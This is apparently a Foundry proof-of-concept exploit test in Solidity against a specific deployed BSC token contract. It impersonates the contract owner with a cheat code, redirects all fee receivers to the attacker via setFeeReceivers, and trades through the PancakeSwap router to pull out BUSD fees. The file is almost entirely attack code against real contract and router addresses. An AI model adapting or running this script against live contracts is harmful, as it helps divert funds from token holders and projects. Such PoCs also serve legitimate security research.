pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ImperialToken_0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f {
    function withdrawAllToOwner(address _receiver) external;
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function claim() external;
    function setFeeReceivers(address, address, address) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IPancakeSwapRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // We just need to impersonate the owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial BUSD balance
        IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        uint256 initialBalance = busd.balanceOf(attacker);

        // Get target contract
        ImperialToken_0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f target = ImperialToken_0x889e8cD93Be2FDF4CCc649Ba9D51e61CFD8C930f(TARGET);

        // Give attacker some BUSD to trade
        deal(address(busd), attacker, 1000 * 10**18);

        // Impersonate the owner address to set fee receivers to attacker
        address owner = 0xE44d394BB296739739617497aaD26c9117A43c77;
        vm.startPrank(owner);
        target.setFeeReceivers(attacker, attacker, attacker);
        vm.stopPrank();

        // Get router address from contract (PancakeSwap Router)
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        IPancakeSwapRouter router = IPancakeSwapRouter(routerAddress);

        // Approve router to spend BUSD
        busd.approve(routerAddress, type(uint256).max);

        // Buy IMF tokens (swap BUSD for IMF)
        address[] memory path = new address[](2);
        path[0] = address(busd);
        path[1] = TARGET;

        // Buy small amount to generate fees
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            100 * 10**18, // 100 BUSD
            0, // accept any amount
            path,
            attacker,
            block.timestamp + 3600
        );

        // Get IMF balance
        target.approve(routerAddress, type(uint256).max);

        // Sell IMF tokens back (swap IMF for BUSD)
        path[0] = TARGET;
        path[1] = address(busd);

        // Get IMF balance to sell
        uint256 imfBalance = target.balanceOf(attacker);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            imfBalance / 2, // sell half
            0, // accept any amount
            path,
            attacker,
            block.timestamp + 3600
        );

        // Verify we received BUSD from fees
        uint256 finalBalance = busd.balanceOf(attacker);
        assertGt(finalBalance, initialBalance + (1000 * 10**18), "BUSD balance should increase from fee collection");
    }





    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

